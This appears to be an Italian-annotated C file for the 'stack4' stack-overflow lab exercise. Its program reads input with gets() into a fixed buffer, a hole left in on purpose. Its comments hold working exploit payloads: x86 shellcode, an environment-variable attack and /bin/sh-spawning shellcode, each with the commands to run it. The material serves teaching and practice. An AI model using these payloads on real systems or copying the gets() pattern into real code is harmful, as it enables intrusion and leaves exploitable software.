/*
gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o stack4 stack4.c
python -c "print '\x59\x6f\x75\x20\x57\x69\x6e\x21' + '\x31\xd2\x83\xc2\x09\x89\xe0\x83\xe8\x5c\x89\xc1\x31\xdb\x43\x31\xc0\x83\xc0\x04\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80'+'A'*51+'\x8c\xf6\xff\xbf'"

NB: sia istruzioni x86 che stringa sono state messe così come uscite da objdump => no reverse a 4 byte
Length Stringa = 8 byte
Length Shellcode = 29 byte
'A' = 51
Tot: 92 byte payload

Istruzioni per modificare shellcode in base ad indirizzi:
1. return address (fine) => inizio shellcode => &buffer + 8

shellcode best:
python -c "print '\xeb\x17\x31\xd2\x83\xc2\x09\x59\x31\xdb\x43\x31\xc0\x83\xc0\x04\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe4\xff\xff\xff\x59\x6f\x75\x20\x57\x69\x6e\x21' + 'A'*50 + '\x84\xf6\xff\xbf'" | ./stack4

// Far stampare "You Win!"

// ENV ATTTACK:
export PWN=$(python -c "print '\x90'*10 + '\xeb\x17\x31\xd2\x83\xc2\x09\x59\x31\xdb\x43\x31\xc0\x83\xc0\x04\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe4\xff\xff\xff\x59\x6f\x75\x20\x57\x69\x6e\x21\x20\x0a'")
./getenvaddr PWN stack4  => Indirizzo ENVIRONMENT PWN
python -c "print 'A'*88 + '\x33\xff\xff\xbf'"| ./stack4 

(python -c "print 'A'*88 + '\x43\xff\xff\xbf'"; cat )| ./stack4   => tiene shell aperta

/bin/sh shellcode : 
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
*/

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x000a0d00)
		printf("you lose!\n");
}
